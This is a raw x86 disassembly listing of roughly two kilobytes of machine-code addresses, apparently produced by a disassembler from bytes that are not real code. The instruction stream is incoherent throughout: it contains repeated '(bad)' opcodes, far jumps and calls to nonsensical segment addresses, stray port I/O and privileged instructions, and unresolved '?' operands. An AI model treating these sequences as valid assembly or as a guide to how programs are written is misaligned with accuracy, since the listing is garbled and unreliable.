  40d7e6:	fist   DWORD PTR [esi-0x10]
  40d7e9:	add    al,0x65
  40d7eb:	fdiv   DWORD PTR [ecx+0x1d]
  40d7ee:	cmp    eax,0x15f4d825
  40d7f3:	xchg   BYTE PTR [eax],ch
  40d7f5:	jne    0x40d7ad
  40d7f7:	or     ah,dl
  40d7f9:	adc    esp,edi
  40d7fb:	ins    BYTE PTR es:[edi],dx
  40d7fc:	add    al,0x1a
  40d7fe:	fwait
  40d7ff:	mov    ch,0x79
  40d801:	mov    ds:0x1c02430f,eax
  40d806:	mov    al,ds:0x3b0905f5
  40d80b:	aas    
  40d80c:	(bad)  
  40d80e:	push   cs
  40d80f:	mov    dl,0xf4
  40d811:	pop    esp
  40d812:	jecxz  0x40d7b8
  40d814:	pop    es
  40d815:	shr    DWORD PTR [eax+ebp*4+0x70c4e59b],1
  40d81c:	mov    eax,0x53598276
  40d821:	rcr    esi,0x36
  40d824:	stos   BYTE PTR es:[edi],al
  40d825:	fadd   QWORD PTR [esi*2+0x2e2571a4]
  40d82c:	call   0x9505376e
  40d831:	dec    esi
  40d832:	adc    BYTE PTR [edx+0x698c21ca],bh
  40d838:	test   eax,0xef2b5d39
  40d83d:	mov    dl,0x7a
  40d83f:	stc    
  40d840:	pop    ebp
  40d841:	mul    DWORD PTR fs:[ebx]
  40d844:	or     ebx,ebx
  40d846:	js     0x40d83a
  40d848:	xchg   ecx,eax
  40d849:	scas   al,BYTE PTR es:[edi]
  40d84a:	mov    BYTE PTR [edi+0x14],dl
  40d84d:	or     BYTE PTR [edi-0x43],cl
  40d850:	xor    al,0x24
  40d852:	inc    ecx
  40d853:	jne    0x40d844
  40d855:	cmp    al,0xa7
  40d857:	es popf 
  40d859:	js     0x40d8a9
  40d85b:	fmul   QWORD PTR [esp+eax*1+0x3a]
  40d85f:	push   cs
  40d860:	inc    eax
  40d861:	(bad)  
  40d862:	cld    
  40d863:	or     al,0xa3
  40d865:	ja     0x40d883
  40d867:	sub    eax,0x879aace
  40d86c:	pop    ebp
  40d86d:	aaa    
  40d86e:	lock fdivr DWORD PTR [eax+edi*2]
  40d872:	xor    BYTE PTR [ecx],bl
  40d874:	mov    cs:0xcd03b6da,eax
  40d87a:	cdq    
  40d87b:	lods   al,BYTE PTR ds:[esi]
  40d87c:	out    0x9d,al
  40d87e:	test   BYTE PTR [edi],bh
  40d880:	mov    BYTE PTR [ebx-0x72],bl
  40d883:	hlt    
  40d884:	mov    dl,0xd
  40d886:	xor    ebx,DWORD PTR [ebx+0x4338719b]
  40d88c:	pop    edi
  40d88d:	cmp    eax,0x8875a319
  40d892:	aam    0xe5
  40d894:	imul   eax,DWORD PTR [edx-0x1318a794],0xffffffc8
  40d89b:	add    eax,DWORD PTR [ebx-0x79]
  40d89e:	pop    esi
  40d89f:	call   0xb850b3f7
  40d8a4:	jge    0x40d860
  40d8a6:	icebp  
  40d8a7:	outs   dx,BYTE PTR ds:[esi]
  40d8a8:	mov    esp,0x6c19fd9c
  40d8ad:	push   ebp
  40d8ae:	(bad)  
  40d8af:	hlt    
  40d8b0:	adc    cl,BYTE PTR ds:0x338c485b
  40d8b6:	push   esi
  40d8b7:	fmul   st,st(7)
  40d8b9:	pop    ebx
  40d8ba:	sbb    edi,edx
  40d8bc:	jmp    0xb1f6:0xc50c791a
  40d8c3:	push   0x27ae7a52
  40d8c8:	ret    
  40d8c9:	std    
  40d8ca:	outs   dx,DWORD PTR ds:[esi]
  40d8cb:	fucomip st,st(0)
  40d8cd:	pop    eax
  40d8ce:	xor    BYTE PTR [ebx-0x6f],bl
  40d8d1:	jmp    0x63e7:0x807fe8ed
  40d8d8:	xchg   edi,eax
  40d8d9:	cmp    ch,BYTE PTR [esp+ebx*1+0x65]
  40d8dd:	mov    ebx,0x6807a9b9
  40d8e2:	push   eax
  40d8e3:	add    al,0xe6
  40d8e5:	pop    eax
  40d8e6:	fisttp QWORD PTR [ebp+0x75]
  40d8e9:	mov    edi,0x2aa1e48
  40d8ee:	cdq    
  40d8ef:	stos   BYTE PTR es:[edi],al
  40d8f0:	dec    esp
  40d8f1:	cmp    ecx,DWORD PTR [eax]
  40d8f3:	push   esi
  40d8f4:	xchg   DWORD PTR [edx-0x718bc8b3],edi
  40d8fa:	push   esp
  40d8fb:	push   edx
  40d8fc:	adc    al,0xcd
  40d8fe:	frstor [edx+0xb]
  40d901:	ja     0x40d92a
  40d903:	mov    ah,BYTE PTR [esi+0x3c]
  40d906:	or     BYTE PTR [eax],dl
  40d908:	pop    ebp
  40d909:	aad    0xe9
  40d90b:	stos   BYTE PTR es:[edi],al
  40d90c:	lock jne 0x40d984
  40d90f:	aaa    
  40d910:	arpl   WORD PTR [edi],di
  40d912:	push   ebp
  40d913:	inc    ebx
  40d914:	ficom  DWORD PTR [edi+0xe34aa0b]
  40d91a:	fcmovu st,st(2)
  40d91c:	pop    esi
  40d91d:	shl    DWORD PTR [ecx+0x5c],0x1f
  40d921:	mov    al,0x12
  40d923:	dec    esi
  40d924:	test   al,0x44
  40d926:	or     eax,0xd544aa75
  40d92b:	push   0xffffffd0
  40d92d:	jns    0x40d95b
  40d92f:	cmp    al,0x3
  40d931:	(bad)  
  40d932:	fistp  WORD PTR [ebx-0x69]
  40d935:	ins    DWORD PTR es:[edi],dx
  40d936:	cmp    BYTE PTR ds:0x36d8cc2d,dl
  40d93c:	dec    esp
  40d93d:	xchg   ecx,eax
  40d93e:	mov    WORD PTR [ebx],?
  40d940:	retf   
  40d941:	ins    BYTE PTR es:[edi],dx
  40d942:	sbb    eax,0x5b5a72a3
  40d947:	mov    bl,0xc7
  40d949:	mov    eax,ds:0xd160fa19
  40d94e:	sar    dh,0x88
  40d951:	mov    ds:0xb3ccda86,eax
  40d956:	mov    ebx,0xe033a6e3
  40d95b:	adc    al,0xd6
  40d95d:	int3   
  40d95e:	in     eax,0xe2
  40d960:	fst    QWORD PTR [eax+0x6efe47d2]
  40d966:	hlt    
  40d967:	(bad)  
  40d968:	jne    0x40d956
  40d96a:	pop    es
  40d96b:	in     al,dx
  40d96c:	inc    eax
  40d96d:	mov    dh,0x58
  40d96f:	adc    al,0x48
  40d971:	sub    eax,0xc72440c4
  40d976:	fst    st(0)
  40d978:	mov    esp,0x4e81846d
  40d97d:	xor    DWORD PTR [eax+ebp*8+0x70],esp
  40d981:	inc    edi
  40d982:	sar    BYTE PTR ss:[ecx+0x4a],1
  40d986:	dec    edi
  40d987:	retf   
  40d988:	add    BYTE PTR [ecx-0x61f47aed],bh
  40d98e:	mov    eax,0xf4fbd69a
  40d993:	cdq    
  40d994:	xlat   BYTE PTR ds:[ebx]
  40d995:	call   0xf2c0:0x3e0f3de6
  40d99c:	lods   al,BYTE PTR ds:[esi]
  40d99d:	mov    fs,WORD PTR [esi-0x55d76a01]
  40d9a3:	jecxz  0x40d940
  40d9a5:	sub    al,0x8
  40d9a7:	dec    edi
  40d9a8:	cwde   
  40d9a9:	mov    bh,0x3d
  40d9ab:	or     bl,BYTE PTR [edi]
  40d9ad:	mov    eax,ds:0x8dffaa12
  40d9b2:	push   ebp
  40d9b3:	clc    
  40d9b4:	sbb    eax,0x44dd2b56
  40d9b9:	lahf   
  40d9ba:	mul    BYTE PTR [ebp-0x7b2ac43d]
  40d9c0:	(bad)  
  40d9c1:	jge    0x40d9df
  40d9c3:	shl    ah,1
  40d9c5:	jno    0x40d98f
  40d9c7:	sti    
  40d9c8:	pop    cx
  40d9ca:	mov    WORD PTR [esi-0xd268288],fs
  40d9d0:	dec    edi
  40d9d1:	dec    ebp
  40d9d2:	mov    ds:0x13df50de,al
  40d9d7:	les    eax,FWORD PTR [edx]
  40d9d9:	cmp    WORD PTR [edi-0x4473488],bp
  40d9e0:	ret    0xad22
  40d9e3:	xchg   ebx,eax
  40d9e4:	ror    DWORD PTR [esi],0xb
  40d9e7:	jnp    0x40d99b
  40d9e9:	nop
  40d9ea:	adc    eax,0x6d66e664
  40d9ef:	pop    ebx
  40d9f0:	jb     0x40da08
  40d9f2:	sub    DWORD PTR [edi+eiz*8-0x36],ecx
  40d9f6:	mov    ch,BYTE PTR [edx+esi*8-0x4cd796d7]
  40d9fd:	mov    dh,0xbb
  40d9ff:	mov    bh,BYTE PTR [esi-0x234aad4e]
  40da05:	sbb    BYTE PTR [ebx-0x573b1ae6],0x4b
  40da0c:	cbw    
  40da0e:	push   edx
  40da0f:	ins    BYTE PTR es:[edi],dx
  40da10:	add    eax,0xe63caa3
  40da15:	adc    al,0x2c
  40da17:	inc    eax
  40da18:	mov    ?,esp
  40da1a:	xchg   edi,eax
  40da1b:	inc    ecx
  40da1c:	aam    0xf4
  40da1e:	xor    bh,BYTE PTR [ecx-0x6c]
  40da21:	out    0x5d,eax
  40da23:	pop    esp
  40da24:	imul   cl
  40da26:	dec    ebp
  40da27:	hlt    
  40da28:	stos   BYTE PTR es:[edi],al
  40da29:	popf   
  40da2a:	test   al,0x68
  40da2c:	cld    
  40da2d:	push   0xa1da0884
  40da32:	jmp    0x7968:0xcd19f2a3
  40da39:	sub    DWORD PTR [edi*2+0x5e23271e],edi
  40da40:	pop    ss
  40da41:	cmc    
  40da42:	lods   al,BYTE PTR ds:[esi]
  40da43:	and    ch,dh
  40da45:	pop    ebp
  40da46:	lea    ebp,[ecx+0x540daaf7]
  40da4c:	jecxz  0x40da73
  40da4e:	mov    WORD PTR [ecx-0x999ae3d],ds
  40da54:	push   edi
  40da55:	jae    0x40da77
  40da57:	retf   0x891b
  40da5a:	inc    eax
  40da5b:	ss inc esp
  40da5d:	xchg   ecx,eax
  40da5e:	push   0xfffffff9
  40da60:	imul   ebp,DWORD PTR [ecx],0x21
  40da63:	sahf   
  40da64:	mov    bl,0x20
  40da66:	icebp  
  40da67:	xchg   esp,eax
  40da68:	mov    edi,DWORD PTR [ebp-0x5c]
  40da6b:	cdq    
  40da6c:	out    0x18,eax
  40da6e:	xchg   DWORD PTR [ebx+0x46cd1b88],ecx
  40da74:	(bad)  
  40da75:	cmp    ch,dh
  40da77:	mov    dl,al
  40da79:	ss std 
  40da7b:	fldenv [edx*4+0x613b1d29]
  40da82:	outs   dx,BYTE PTR ds:[esi]
  40da83:	(bad)  
  40da84:	in     eax,dx
  40da85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da86:	mov    esi,0xabb9ad45
  40da8b:	dec    edx
  40da8c:	pop    bx
  40da8e:	push   ebp
  40da8f:	dec    ecx
  40da90:	sbb    eax,0x93a841c2
  40da95:	fs push ecx
  40da97:	jg     0x40daff
  40da99:	push   cs
  40da9a:	adc    DWORD PTR [edi+0x29],ebx
  40da9d:	shr    esi,1
  40da9f:	push   cs
  40daa0:	sub    al,0x8
  40daa2:	mov    edx,0x35f80481
  40daa7:	ss dec esi
  40daa9:	in     al,dx
  40daaa:	icebp  
  40daab:	ret    0xa72c
  40daae:	mov    esi,0xa6d49061
  40dab3:	pop    edx
  40dab4:	push   ecx
  40dab5:	iret   
  40dab6:	mov    fs,WORD PTR [esi-0x6ef835e5]
  40dabc:	add    ch,BYTE PTR [esi+edi*4+0x66]
  40dac0:	scas   eax,DWORD PTR es:[edi]
  40dac1:	mov    eax,ds:0x931524ca
  40dac6:	push   edx
  40dac7:	or     dh,BYTE PTR [edx-0x2779766a]
  40dacd:	outs   dx,BYTE PTR ds:[esi]
  40dace:	adc    ebx,DWORD PTR [edx]
  40dad0:	fwait
  40dad1:	mov    eax,ds:0x15d0986f
  40dad6:	in     eax,dx
  40dad7:	cmp    eax,0x2ef5624e
  40dadc:	rol    BYTE PTR [esi+0x33],0x8f
  40dae0:	mov    cl,0x57
  40dae2:	push   0xffffffef
  40dae4:	fstp   TBYTE PTR [edi]
  40dae6:	push   ss
  40dae7:	aad    0xee
  40dae9:	sbb    eax,0xd98d729e
  40daee:	push   edi
  40daef:	mov    ds:0xdc3059ec,eax
  40daf4:	stc    
  40daf5:	jo     0x40da86
  40daf7:	adc    al,al
  40daf9:	icebp  
  40dafa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dafb:	ins    DWORD PTR es:[edi],dx
  40dafc:	(bad)  
  40dafd:	xor    al,0x34
  40daff:	fidiv  WORD PTR [ebx+esi*8-0x33]
  40db03:	jl     0x40db0c
  40db05:	outs   dx,BYTE PTR ds:[esi]
  40db06:	adc    al,0xe8
  40db08:	popa   
  40db09:	sti    
  40db0a:	mov    al,BYTE PTR [esi-0x361c1fa3]
  40db10:	je     0x40daca
  40db12:	mov    ?,WORD PTR [esi]
  40db14:	ins    DWORD PTR es:[edi],dx
  40db15:	add    al,0x3b
  40db17:	cmp    DWORD PTR [eax+0x337892b8],ebp
  40db1d:	cld    
  40db1e:	jmp    0x40db41
  40db20:	pop    esi
  40db21:	int3   
  40db22:	sti    
  40db23:	loopne 0x40db2c
  40db25:	mov    eax,ds:0x22e8ba2d
  40db2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db2b:	mov    eax,ds:0x69c96206
  40db30:	fs out dx,eax
  40db32:	cmp    al,0xd4
  40db34:	enter  0xa9fa,0x5c
  40db38:	stos   DWORD PTR es:[edi],eax
  40db39:	cld    
  40db3a:	popa   
  40db3b:	and    eax,0x9dc7dd5f
  40db40:	jns    0x40db09
  40db42:	pop    esi
  40db43:	sar    DWORD PTR [edi],1
  40db45:	xlat   BYTE PTR ds:[ebx]
  40db46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db47:	mov    ch,ah
  40db49:	jmp    0x17ad:0xea8ff040
  40db50:	sbb    al,BYTE PTR [eax-0x47ecac5]
  40db56:	xchg   edi,eax
  40db57:	dec    ebp
  40db58:	inc    edi
  40db59:	pop    esi
  40db5a:	or     eax,DWORD PTR [ecx+0x8]
  40db5d:	test   al,0x87
  40db5f:	lods   eax,DWORD PTR ds:[esi]
  40db60:	inc    ecx
  40db61:	outs   dx,DWORD PTR ds:[esi]
  40db62:	fmul   DWORD PTR [edi]
  40db64:	call   0x3db7:0xea0474c4
  40db6b:	in     al,dx
  40db6c:	pop    ebx
  40db6d:	sub    ah,cl
  40db6f:	(bad)  
  40db70:	and    BYTE PTR [edx-0x70],cl
  40db73:	xchg   ebx,eax
  40db74:	inc    edx
  40db75:	mov    dh,al
  40db77:	mov    DWORD PTR [ecx],ebx
  40db79:	mov    ds:0xa0c1aa1d,eax
  40db7e:	loopne 0x40dbf1
  40db80:	and    BYTE PTR [ecx-0x626a0277],cl
  40db86:	(bad)  
  40db87:	mov    bh,0x23
  40db89:	pop    edi
  40db8a:	sar    BYTE PTR [eax+0x61e04922],0x6b
  40db91:	out    0xf5,eax
  40db93:	loopne 0x40dba5
  40db95:	sub    bh,BYTE PTR [edx+0x2c]
  40db98:	sbb    al,0x6f
  40db9a:	inc    ebx
  40db9b:	out    dx,al
  40db9c:	jb     0x40dbd3
  40db9e:	dec    ecx
  40db9f:	mov    BYTE PTR [esi],ch
  40dba1:	xchg   ebx,eax
  40dba2:	outs   dx,BYTE PTR ds:[esi]
  40dba3:	push   es
  40dba4:	aad    0xee
  40dba6:	mov    ch,0x4c
  40dba8:	add    DWORD PTR [ebx],ecx
  40dbaa:	rcr    esi,1
  40dbac:	xchg   ecx,eax
  40dbad:	sub    BYTE PTR [ebx],cl
  40dbaf:	sbb    al,0xd2
  40dbb1:	sar    BYTE PTR [esp+edi*4],cl
  40dbb4:	fidivr WORD PTR [ebp+0x4477cedd]
  40dbba:	xchg   ebp,eax
  40dbbb:	push   es
  40dbbc:	(bad)  
  40dbbd:	clc    
  40dbbe:	mov    edx,0xdf483ecc
  40dbc3:	and    DWORD PTR [edx+0x30],edx
  40dbc6:	in     eax,dx
  40dbc7:	pusha  
  40dbc8:	mov    DWORD PTR ds:0x8a227f60,eax
  40dbce:	imul   esp,ebp,0x795e8bf2
  40dbd4:	cmp    ch,bh
  40dbd6:	mov    WORD PTR [ebp+0x73a8e3ed],?
  40dbdc:	add    DWORD PTR [edi-0x48],eax
  40dbdf:	fbstp  TBYTE PTR [ebp+0x197cbe3c]
  40dbe5:	push   ecx
  40dbe6:	inc    edx
  40dbe7:	ds jmp 0x38d8:0xcbca1fc2
  40dbef:	dec    ebp
  40dbf0:	dec    ebx
  40dbf1:	retf   
  40dbf2:	les    esi,FWORD PTR [edx+0x5076ab05]
  40dbf8:	(bad)  
  40dbf9:	loopne 0x40dc28
  40dbfb:	imul   DWORD PTR [ecx-0x2972a75b]
  40dc01:	sbb    dl,BYTE PTR [ebx+0x63e253df]
  40dc07:	sub    DWORD PTR ds:0x4e9329d0,ebx
  40dc0d:	js     0x40dbbd
  40dc0f:	test   al,0xf7
  40dc11:	inc    esi
  40dc12:	sbb    edi,esp
  40dc14:	push   cs
  40dc15:	push   es
  40dc16:	mov    ds:0x1dba8b95,eax
  40dc1b:	popf   
  40dc1c:	dec    edx
  40dc1d:	ss loope 0x40dc50
  40dc20:	mov    dl,0x17
  40dc22:	(bad)  
  40dc23:	dec    ecx
  40dc25:	xor    DWORD PTR [edi-0xb],0xd80b9437
  40dc2c:	aaa    
  40dc2d:	dec    ebx
  40dc2e:	dec    edx
  40dc2f:	pop    edi
  40dc30:	sbb    al,0xb1
  40dc32:	pop    ecx
  40dc33:	outs   dx,BYTE PTR ds:[esi]
  40dc34:	cmp    dl,BYTE PTR [eax]
  40dc36:	dec    ebx
  40dc37:	enter  0x6405,0x43
  40dc3b:	mov    ds:0x4a934924,al
  40dc40:	out    0x6c,eax
  40dc42:	sbb    ecx,ecx
  40dc44:	xchg   edi,eax
  40dc45:	std    
  40dc46:	sbb    ecx,ebp
  40dc48:	arpl   WORD PTR gs:[edx+0x6cbb3d9e],dx
  40dc4f:	mov    al,ds:0xf496d7e8
  40dc54:	ds mov edx,0x70bf7186
  40dc5a:	xchg   esp,eax
  40dc5b:	retf   
  40dc5c:	lock aas 
  40dc5e:	cmp    eax,0xf1c4a29b
  40dc63:	mov    ah,0x1c
  40dc65:	sbb    eax,DWORD PTR [eax-0x32]
  40dc68:	inc    edi
  40dc69:	mov    ah,BYTE PTR [edi+ebx*4-0x49]
  40dc6d:	ror    BYTE PTR [esi],cl
  40dc6f:	jbe    0x40dc56
  40dc71:	add    eax,0xae01df28
  40dc76:	xchg   ecx,eax
  40dc77:	arpl   WORD PTR [eax+0x18],ax
  40dc7a:	outs   dx,BYTE PTR ds:[esi]
  40dc7b:	test   BYTE PTR [esi],bl
  40dc7d:	cdq    
  40dc7e:	icebp  
  40dc7f:	sbb    DWORD PTR [esi+0xf7eba95],edi
  40dc85:	cmp    si,di
  40dc88:	aaa    
  40dc89:	popa   
  40dc8a:	jnp    0x40dce0
  40dc8c:	push   edi
  40dc8d:	adc    BYTE PTR [ebp+0x58],bl
  40dc90:	sub    al,0x1a
  40dc92:	cdq    
  40dc93:	inc    edi
  40dc94:	enter  0xc097,0x49
  40dc98:	dec    ebp
  40dc99:	push   edi
  40dc9a:	lds    esp,FWORD PTR [ebx-0x16]
  40dc9d:	xor    al,0x76
  40dc9f:	sbb    BYTE PTR [ebp-0x80],ch
  40dca2:	pop    ebx
  40dca3:	inc    edx
  40dca4:	scas   al,BYTE PTR es:[edi]
  40dca5:	push   ds
  40dca6:	repz mov dh,BYTE PTR [eax+0x1dd813db]
  40dcad:	stos   BYTE PTR es:[edi],al
  40dcae:	mov    ds:0x4d4c6970,al
  40dcb3:	ds and ebp,ecx
  40dcb6:	push   0x16563805
  40dcbb:	aas    
  40dcbc:	or     al,0x52
  40dcbe:	dec    ebp
  40dcbf:	cwde   
  40dcc0:	mov    DWORD PTR [esi],esi
  40dcc2:	jns    0x40dcbd
  40dcc4:	jnp    0x40dc5b
  40dcc6:	lock not DWORD PTR [edi*2-0x486cc9e9]
  40dcce:	aas    
  40dccf:	lock pop edx
  40dcd1:	fisttp QWORD PTR [eax+0x5c]
  40dcd4:	hlt    
  40dcd5:	jo     0x40dc5c
  40dcd7:	test   dl,cl
  40dcd9:	and    DWORD PTR [ebp-0x59cbfdeb],eax
  40dcdf:	clc    
  40dce0:	mov    ah,0x94
  40dce2:	retf   0x9046
  40dce5:	in     al,dx
  40dce6:	enter  0xb7d8,0x8c
  40dcea:	int3   
  40dceb:	sbb    edx,DWORD PTR [esi]
  40dced:	xchg   ebp,eax
  40dcee:	sti    
  40dcef:	sub    ah,dl
  40dcf1:	jae    0x40dcd6
  40dcf3:	cli    
  40dcf4:	inc    ebp
  40dcf5:	xchg   ebx,eax
  40dcf6:	std    
  40dcf7:	nop/reserved BYTE PTR [ecx+0x1]
  40dcfb:	inc    edx
  40dcfc:	cdq    
  40dcfd:	pop    ecx
  40dcfe:	js     0x40dcd7
  40dd00:	dec    esi
  40dd01:	add    al,0x97
  40dd03:	out    dx,eax
  40dd04:	push   0xffffffa0
  40dd06:	xor    edx,DWORD PTR [esi-0x51]
  40dd09:	xlat   BYTE PTR ds:[ebx]
  40dd0a:	mov    edx,0xa296b425
  40dd0f:	call   0xafdc:0xfde21e73
  40dd16:	add    eax,edx
  40dd18:	sub    eax,0xa1e4dd73
  40dd1d:	xlat   BYTE PTR ds:[ebx]
  40dd1e:	xchg   edi,eax
  40dd1f:	add    DWORD PTR [eax],0x12a9d806
  40dd25:	das    
  40dd26:	fstp   TBYTE PTR [ebp+0x67]
  40dd29:	mov    ?,WORD PTR [ebx]
  40dd2b:	dec    ebx
  40dd2c:	sti    
  40dd2d:	cld    
  40dd2e:	inc    esi
  40dd2f:	mov    cl,0x6b
  40dd31:	sub    dh,BYTE PTR [eax]
  40dd33:	or     ch,BYTE PTR [esi]
  40dd35:	jae    0x40dd91
  40dd37:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40dd39:	lods   eax,DWORD PTR ds:[esi]
  40dd3a:	fiadd  DWORD PTR [eax-0x69]
  40dd3d:	retf   0x570f
  40dd40:	test   eax,0x3421003e
  40dd45:	outs   dx,BYTE PTR ds:[esi]
  40dd46:	sbb    ah,BYTE PTR [ecx-0x5a]
  40dd49:	inc    eax
  40dd4a:	int    0x30
  40dd4c:	push   edx
  40dd4d:	das    
  40dd4e:	je     0x40dcea
  40dd50:	mov    al,ds:0x8dcfa50a
  40dd55:	jo     0x40dd12
  40dd57:	jb     0x40dd39
  40dd59:	cmp    al,0x25
  40dd5b:	push   edx
  40dd5c:	rcr    ah,0x10
  40dd5f:	xchg   ebp,eax
  40dd60:	jae    0x40ddca
  40dd62:	sub    edx,DWORD PTR [eax-0x22514026]
  40dd68:	rol    DWORD PTR [eax-0x24],cl
  40dd6b:	jo     0x40ddb8
  40dd6d:	cmc    
  40dd6e:	adc    DWORD PTR [eax+ecx*8],0x68
  40dd72:	dec    esp
  40dd73:	add    al,0xbe
  40dd75:	ret    
  40dd76:	add    eax,0xc487c2af
  40dd7b:	jnp    0x40dd00
  40dd7d:	inc    edi
  40dd7e:	dec    edx
  40dd7f:	dec    edi
  40dd80:	sub    DWORD PTR [edi-0x7f],ecx
  40dd83:	sub    al,0x64
  40dd85:	xchg   esp,eax
  40dd86:	adc    edi,DWORD PTR [edi+0x18]
  40dd89:	adc    eax,0x8f30bf45
  40dd8e:	mov    ch,ch
  40dd90:	fdivr  st,st(1)
  40dd92:	add    BYTE PTR [edx+0x17],bl
  40dd95:	push   es
  40dd96:	inc    esi
  40dd97:	push   0x7c
  40dd99:	push   0x4eac6c3e
  40dd9e:	lock cmp DWORD PTR [ecx-0x1e],esi
  40dda2:	psubusb mm0,QWORD PTR [ebp+0x78]
  40dda6:	jno    0x40dddb
  40dda8:	rcl    BYTE PTR [ebp+0x76],1
  40ddab:	adc    bh,BYTE PTR [edi+0x34d1d248]
  40ddb1:	mov    al,0x77
  40ddb3:	jmp    0xd20d:0xcb5ee1b
  40ddba:	loope  0x40ddc6
  40ddbc:	xchg   ebx,eax
  40ddbd:	cs stos BYTE PTR es:[edi],al
  40ddbf:	adc    eax,0x4735b708
  40ddc4:	(bad)  
  40ddc5:	outs   dx,DWORD PTR ds:[esi]
  40ddc6:	add    BYTE PTR [esi-0x79fb1549],dh
  40ddcc:	js     0x40dda3
  40ddce:	int    0x37
  40ddd0:	add    BYTE PTR [esi-0x3a9fcd0a],0x3
  40ddd7:	loope  0x40dd95
  40ddd9:	jne    0x40dde8
  40dddb:	cmp    BYTE PTR [esi-0x3d],bh
  40ddde:	aam    0x48
  40dde0:	in     al,0xa9
  40dde2:	iret   
  40dde3:	not    DWORD PTR [eax]
  40dde5:	sub    al,0xdc
  40dde7:	out    0x2f,eax
  40dde9:	mov    edx,edi
  40ddeb:	mov    al,0xd1
  40dded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddee:	adc    eax,DWORD PTR [esi+ebp*4-0x4]
  40ddf2:	stos   BYTE PTR es:[edi],al
  40ddf3:	jbe    0x40ddf9
  40ddf5:	mov    al,ds:0x597bb1f0
  40ddfa:	xor    BYTE PTR [edx+0x381d4673],ah
  40de00:	and    eax,0xc558da5a
  40de05:	sub    BYTE PTR [ebp-0x22a6e201],dl
  40de0b:	imul   ebx,DWORD PTR [ebx-0x373d9bab],0x5714928b
  40de15:	pop    esi
  40de16:	inc    ebx
  40de17:	clc    
  40de18:	push   ebx
  40de19:	inc    ebx
  40de1a:	or     ah,BYTE PTR [ecx+0x10]
  40de1d:	xor    esp,ebx
  40de1f:	inc    eax
  40de20:	mov    cl,0xab
  40de22:	test   edx,0xb67d86c1
  40de28:	test   BYTE PTR [ecx-0x4ec1e501],al
  40de2e:	sbb    eax,0x5b3e369b
  40de33:	repz inc esi
  40de35:	lock push edx
  40de37:	into   
  40de38:	aaa    
  40de39:	data16 mov BYTE PTR [eax+0x18a8a5d9],ah
  40de40:	jmp    0x484d:0x9905a914
  40de47:	push   edx
  40de48:	ficomp DWORD PTR [ebx-0x15560ae6]
  40de4e:	js     0x40de40
  40de50:	imul   DWORD PTR ds:0x124bd334
  40de56:	inc    ebx
  40de57:	pop    ss
  40de58:	ss pop edi
  40de5a:	pop    ebx
  40de5b:	popf   
  40de5c:	call   0xa218:0x71513296
  40de63:	add    eax,ecx
  40de65:	les    edx,FWORD PTR [ecx+0x48]
  40de68:	ret    0x27da
  40de6b:	repnz mov ecx,0x2e5c5cd5
  40de71:	xchg   edx,eax
  40de72:	push   cs
  40de73:	add    eax,0xc6e66b71
  40de78:	aaa    
  40de79:	xchg   ebx,eax
  40de7a:	push   0xffffff97
  40de7c:	xchg   DWORD PTR [ecx+0x54],esp
  40de7f:	push   esp
  40de80:	adc    BYTE PTR [ebp-0x3f],bh
  40de83:	add    DWORD PTR [eax+0x5b],0xffffffb8
  40de87:	xchg   BYTE PTR [esi+edi*1-0x30],ah
  40de8b:	sub    ecx,DWORD PTR [ebx]
  40de8d:	mov    ebx,0x35ad5a47
  40de92:	jns    0x40ded1
  40de94:	outs   dx,DWORD PTR ds:[esi]
  40de95:	cld    
  40de96:	sbb    DWORD PTR [edi+0x50],ecx
  40de99:	(bad)  
  40de9a:	repz sbb ecx,DWORD PTR [eax-0x3e]
  40de9e:	sbb    DWORD PTR [edi-0x669a8aee],edi
  40dea4:	pop    ss
  40dea5:	xchg   BYTE PTR [ebx-0x45],cl
  40dea8:	gs mov ch,0xd9
  40deab:	dec    esp
  40deac:	cmp    dl,BYTE PTR [eax-0x49207b86]
  40deb2:	cmp    BYTE PTR [esi],cl
  40deb4:	gs nop
  40deb6:	punpcklbw mm2,DWORD PTR [ebx]
  40deb9:	mov    ah,0xe3
  40debb:	mov    al,ds:0x8267db86
  40dec0:	dec    edi
  40dec1:	call   FWORD PTR [edx-0x9be4166]
  40dec7:	pushf  
  40dec8:	add    ah,0xdc
  40decb:	pop    esp
  40decc:	push   ss
  40decd:	add    al,0x3e
  40decf:	dec    ebp
  40ded0:	dec    ebx
  40ded1:	leave  
  40ded2:	add    bh,ah
  40ded4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ded5:	cwde   
  40ded6:	push   cs
  40ded7:	xor    BYTE PTR [edi+0x61754f93],dl
  40dedd:	(bad)  
  40dedf:	enter  0xa4e1,0xef
  40dee3:	sub    bl,BYTE PTR [edi]
  40dee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dee6:	push   ebx
  40dee7:	sbb    esp,edi
  40dee9:	and    eax,0xeb5bd5e2
  40deee:	jmp    0xa63b7845
  40def3:	loopne 0x40de7e
  40def5:	mov    BYTE PTR [eax-0x4],cl
  40def8:	(bad)  
  40def9:	and    eax,0xbef9959
  40defe:	add    BYTE PTR [esi-0x2f40c5f5],0xd5
  40df05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df06:	data16 stc 
  40df08:	outs   dx,DWORD PTR ds:[esi]
  40df09:	adc    al,0xf6
  40df0b:	aam    0x98
  40df0d:	and    esp,eax
  40df0f:	mov    esi,0xffd12c64
  40df14:	pop    eax
  40df15:	loopne 0x40deb2
  40df17:	je     0x40dec7
  40df19:	jne    0x40df30
  40df1b:	pushf  
  40df1c:	sub    eax,DWORD PTR [edi+0x3d7679c2]
  40df22:	or     BYTE PTR [edi-0x1d],0xad
  40df26:	pop    es
  40df27:	add    BYTE PTR [ecx+esi*1+0x49],ah
  40df2b:	sbb    al,cl
  40df2d:	mov    ecx,0x38e5d5fe
  40df32:	dec    eax
  40df33:	fwait
  40df34:	push   ebx
  40df35:	and    al,cl
  40df37:	in     eax,0x85
  40df39:	mov    edi,0xe43e1aba
  40df3e:	(bad)  
  40df40:	out    dx,al
  40df41:	ret    
  40df42:	outs   dx,BYTE PTR ds:[esi]
  40df43:	mov    eax,0x7995bea0
  40df48:	(bad)  
  40df49:	ja     0x40dfca
  40df4b:	call   0xdaf4:0x76882e80
  40df52:	cmp    BYTE PTR [esi+0x4b],cl
  40df55:	inc    ecx
